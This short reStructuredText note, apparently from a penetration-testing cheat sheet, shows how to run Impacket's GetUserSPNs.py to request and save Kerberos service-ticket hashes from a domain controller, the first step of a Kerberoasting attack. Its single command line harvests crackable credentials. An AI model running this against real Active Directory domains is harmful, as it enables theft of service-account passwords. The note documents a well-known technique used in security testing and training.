Using GetUsersSPNs.py
************************

Get Hashes
############

Use Impacket script to get list of service usernames which are associated with normal user accounts

.. code-block:: console

   GetUserSPNs.py -request -dc-ip <dc_ip> <domainName>/<serviceUser> -save -outputfile <file.txt>
